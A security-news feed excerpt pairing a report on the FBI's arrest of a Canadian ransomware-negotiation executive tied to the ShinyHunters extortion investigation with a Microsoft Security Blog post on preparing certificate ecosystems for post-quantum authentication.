The New York Times reported today that the FBI has arrested a Canadian man in Pennsylvania on suspicion of assisting ShinyHunters. The Times story did not identify the man, nor did a statement on Twitter/X about the arrest from FBI Director Kash Patel.

One source close to the investigation told KrebsOnSecurity the Canadian person arrested this week was visiting Pennsylvania for a cyber insurance conference, and that the suspect’s company specialized in handling ransomware negotiations with cybercrime groups. Another shared that control over the ShinyHunters investigation has been centralized at an FBI field office in Texas.

An online search reveals the Cyber Risk Summit was held at the Loews Philadelphia Hotel between Oct. 5 and Oct. 7. The conference had several sponsors, but according to the summit’s website its biggest sponsor was a Canadian security company called Cypfer.

According to LinkedIn, one of Cypfer’s “ex-founders” was Edward Dubrovsky, who is now associated with another Canadian security firm and sponsor called CyberSteward. In a post to LinkedIn approximately one month ago, Dubrovsky said he had plans to attend the Cyber Risk Summit with the rest of the CyberSteward team.

[Update: Oct. 10, 9:58 a.m. ET: A spokesperson for Cypfer said Dubrovsky was not a founder or co-founder as his LinkedIn profile claims, but instead served as a managing director before resigning in December 2025].

Edward Dubrovsky’s LinkedIn profile.

“Looking forward to continuing conversations around strategy & compliant driven coercive (ransomware, extortion) advisory, negotiations and settlement services that are global and truly agnostic,” Dubrovsky wrote.

Federal court records show that on October 8, an Edward Dobrovsky (note the slight misspelling of the last name) was arrested in Pennsylvania on cyber extortion and conspiracy charges. Several of those documents — including the core complaint — are now sealed. But a handful of them were indexed at Courtlistener.com, including a summary of the complaint, which charges the defendant with “conspiracy to threaten to impair the confidentiality of information with the intent to extort money,” and “interference with commerce by threats.”

Image: Courtlistener.com

The inmate locator at the U.S. Bureau of Prisons website reports that a 54-year-old Edward Dubrovsky is currently being held at a federal facility in Philadelphia. But the court records indexed by CourtListener include a notice filed on October 9 that moved the case to the Eastern District of Texas, which sources say is now the epicenter of the FBI’s ShinyHunters investigation. The FBI declined to comment for this story.

Dubrovsky’s LinkedIn profile states he is the author of Cyber Extortion Strategic Response, a 252-page book that promises to “take readers beyond the ransom note and into the decisions that determine how an organization responds, recovers, and protects what matters.”

Edward Dubrovsky’s book, which centers on the intricacies of ransomware negotiations.

“At the heart of the book is a critical distinction: communicating with a criminal is not the same as negotiating a payment, and negotiating is not a commitment to pay,” reads an excerpt from the book’s listing on Amazon. “Engagement can serve other objectives, including testing claims, gathering information, creating time, and preserving options while the organization evaluates its next move.”

Mr. Dubrovsky could not be immediately reached for comment. KrebsOnSecurity also sought comment from other executives at CyberSteward, and will update this post in the event they respond. The available court records in Dubrovsky’s case show that he does not currently have an attorney and has yet to be appointed a public defender by the courts.

ShinyHunters typically uses phishing and stolen credentials to siphon data from corporate accounts at software-as-a-service companies, and then threatens to publish the stolen data online unless a ransom demand is paid. According to the FBI, the group has extorted more than $70 million from victims so far this year.

Sources tell KrebsOnSecurity the FBI has been poring over devices that were seized last month when the Dutch police arrested the convicted cybercriminal Pepijn van der Stap in connection with the ShinyHunters investigation, and that charges against principals at other companies that specialize in ransomware negotiation may be forthcoming.

Immediately after Van der Stap’s arrest, another member of ShinyHunters named “Rey” assumed control over the group and began taunting the FBI over data the group stole from the agency’s online recruitment portal, which included each’s person’s unit and specialization, as well as medical and psychiatric records.

Last week, Reuters reported that Rey — identified as a teenager named Saif Al-din Khader — had been detained and was cooperating with FBI investigators. On October 7, we detailed how Rey was apprehended as the cybercrime group allegedly sought to extort a navigation and digital aviation unit that was divested by Boeing in late 2025.

This is likely to be a fast-moving story. Updates will be noted along with timestamps.

item.title: Post-quantum authentication: Why organizations should start testing certificate ecosystems now
item.description:
Prepare for post-quantum authentication by testing certificate ecosystems now. Learn how Microsoft’s PQC TLS Pilot Program helps advance future readiness.

The post Post-quantum authentication: Why organizations should start testing certificate ecosystems now appeared first on Microsoft Security Blog.
item.content:encoded:
1. Why post-quantum authentication presents a different challenge
  2. Why organizations should begin preparing now
  3. Microsoft's perspective on readiness
  4. Testing the future certificate ecosystem
  5. Expanding end-to-end testing
  6. What organizations can do today
  7. Looking ahead
  8. Learn more

Post-quantum cryptography (PQC) planning often focuses on protecting encrypted data, but authentication systems must also evolve. Certificates, trust anchors, PKI services, applications, devices, and hardware security modules may all be affected by new algorithms and larger certificate chains.

Microsoft’s Post-Quantum Cryptography (PQC) Transport Layer Security (TLS) Pilot Program helps eligible certificate authorities evaluate interoperability and operational readiness in controlled environments. Organizations should begin now by inventorying certificate dependencies, assessing vendor roadmaps, identifying long-lived infrastructure, and creating non-production test environments. Early testing can surface compatibility and process gaps before post-quantum authentication is required at scale.

By the end of this article, security leaders, public key infrastructure (PKI) administrators, and architects will understand the key certificate dependencies, migration risks, and practical first steps for post-quantum authentication readiness.

Why post-quantum authentication presents a different challenge

Much of the current PQC readiness discussion focuses on confidentiality and the ‘harvest now, decrypt later’ risk, in which adversaries collect encrypted data today with the expectation that future quantum computers could decrypt it.

Authentication introduces a different set of challenges.

While confidentiality protections primarily focus on safeguarding encrypted communications, authentication depends on a broad ecosystem of technologies and trust relationships. Certificates and private keys must be issued, distributed, stored, validated, renewed, and managed across diverse environments and vendors. Changes to cryptographic algorithms can therefore have implications that extend beyond cryptographic correctness into operational processes, interoperability, and infrastructure readiness.

Organizations frequently understand where TLS protects their communications. Fewer organizations have a complete inventory of every system that issues, validates, stores, distributes, or depends on certificates.

As the industry moves toward post-quantum authentication, security teams will need greater visibility into those dependencies.

Why organizations should begin preparing now

The transition to post-quantum authentication is unlikely to be a single technology upgrade.

Enterprise environments often contain decades of accumulated infrastructure, including internally managed PKI deployments, embedded devices, operational technology, security appliances, custom applications, third-party services, and hardware-backed trust systems. Some of these technologies may have long deployment lifecycles, fixed cryptographic assumptions, or operational constraints that are not immediately visible until testing begins.

The challenge facing organizations is not that post-quantum standards are unavailable. Rather, it is understanding how proposed post-quantum certificate hierarchies interact with the systems and processes already deployed across their environments.

Testing helps answer questions such as:

  • Can existing applications correctly process and validate post-quantum certificates?
  • How do larger post-quantum certificates and certificate chains affect handshake size, performance, storage, transmission, and inspection limits?
  • Do enterprise PKI workflows require changes to accommodate new algorithms?
  • Are network monitoring, inspection, or certificate-management systems prepared for post-quantum authentication?
  • Are hardware security modules and other cryptographic infrastructure components ready to support future certificate requirements?
  • What hidden dependencies exist within supply chains, vendors, and third-party services?

In many cases, organizations may not yet know which of these questions are most relevant to their environments. Identifying those unknowns is one of the primary reasons ecosystem testing is important today.

Microsoft’s perspective on readiness

Post-quantum authentication readiness requires validating how certificate chains, platforms, and operational processes behave together.

The goal is not simply to determine whether a certificate can be issued or validated. The goal is to identify interoperability, compatibility, performance, and operational challenges before post-quantum authentication must be deployed at scale.

Organizations should view post-quantum readiness as a multi-year planning effort rather than a future migration project. Security leaders who begin inventorying dependencies, assessing vendor readiness, and testing interoperability now will be better positioned to make informed decisions as standards, platform support, and industry requirements continue to evolve.

Testing the future certificate ecosystem

To help the ecosystem gain practical experience with post-quantum authentication, Microsoft launched the PQC TLS Pilot Program on August 27, 2026.

The pilot enables approved certificate authorities in good standing with the Microsoft Trusted Root Program to evaluate PQC TLS roots and certificate issuance using quantum-resilient Module-Lattice-Based Digital Signal Algorithm, ML-DSA-87.

The program is intended to create a controlled environment where participants can evaluate interoperability, compatibility, performance, and operational considerations associated with post-quantum certificate hierarchies.

Certificates issued through the pilot are not publicly trusted and are intended solely for interoperability and ecosystem-readiness testing in closed environments, custom applications, and enterprise testbeds. They must not be used for production trust scenarios or public-facing websites. ML-DSA support remains limited and evolving during the pilot and should not be relied upon for production use.

According to the Microsoft Trusted Root Program Annoucement, the August 2026 release added seven pilot roots operated by ComSign, DigiCert, HARICA, IdenTrust Services, Sectigo, Shanghai Electronic Certification Authority, and SSL.com.

The pilot will continue with rolling admissions through the end of 2026, providing additional opportunities for eligible certificate authorities participating in the Microsoft Trusted Root Program to join. Organizations that participate in the Microsoft Trusted Root Program and are interested in evaluating post-quantum authentication readiness should review the PQC TLS Pilot Program requirements and application process through the https://aka.ms/rootcert. The pilot provides eligible certificate authorities with an opportunity to test interoperability, operational processes, and ecosystem readiness ahead of broader post-quantum authentication adoption.

The objective is not to validate a predetermined outcome. It is to help the certificate ecosystem discover where modernization, testing, and operational improvements may be required before post-quantum authentication can be adopted broadly.

Expanding end-to-end testing

On supported and appropriately configured Windows 11 systems, ML-DSA certificates can be evaluated in the pilot’s controlled, non-production testing scenarios. Support begins with the July 28, 2026 updates: KB5101681 (OS Build 28000.2608) for 26H1 and KB5101684 (OS Builds 26200.8973 and 26100.8973) for 25H2.

ML-DSA certificates can also be used with Secure Channel (Schannel) in supported scenarios. Confirm the applicable Windows and Schannel platform requirements before testing.

Together, Microsoft platform support and the PQC TLS Pilot Program provide a controlled way to identify application incompatibilities, certificate-size constraints, performance effects, and operational workflow gaps before they affect production environments.

What organizations can do today

Organizations do not need to wait for broad industry adoption to begin preparing for post-quantum authentication.

Security leaders, PKI administrators, and architects can begin by:

1. Inventory certificate-dependent systems. Identify applications, services, devices, appliances, and infrastructure that depend on certificates for authentication, trust establishment, or lifecycle management.

2. Map trust relationships.

Document both public and private PKI environments, including internal certificate hierarchies, trust anchors, device authentication systems, and externally managed certificates.

3. Assess vendor readiness.

Engage certificate providers, PKI vendors, hardware security module (HSM) providers, software vendors, and platform providers to understand their post-quantum roadmaps and testing capabilities.

4. Identify long-lived infrastructure.

Pay particular attention to systems with lengthy upgrade cycles, including embedded devices, appliances, operational technology environments, and security infrastructure.

5. Develop a safe testing strategy.

Establish non-production environments where post-quantum certificate hierarchies can be evaluated for interoperability, performance, and operational impacts.

6. Build a multi-year transition roadmap.

Treat post-quantum authentication readiness as a program rather than a project. Assign owners, sequence dependencies, and use test results to prioritize modernization work before future requirements emerge.

Organizations interested in testing should consult their certificate provider about whether it participates in the pilot and whether it offers testing opportunities appropriate for their environment.

If your certificate provider participates in the Microsoft Trusted Root Program but is not currently part of the pilot, consider encouraging them to participate through the program’s admissions process.

Looking ahead

Post-quantum authentication will require coordinated changes across certificate authorities, platforms, software, hardware, and enterprise environments. Organizations that begin testing trust infrastructure and certificate dependencies now will be better positioned to reduce future migration risk and strengthen readiness for a quantum-resistant future.

Learn more
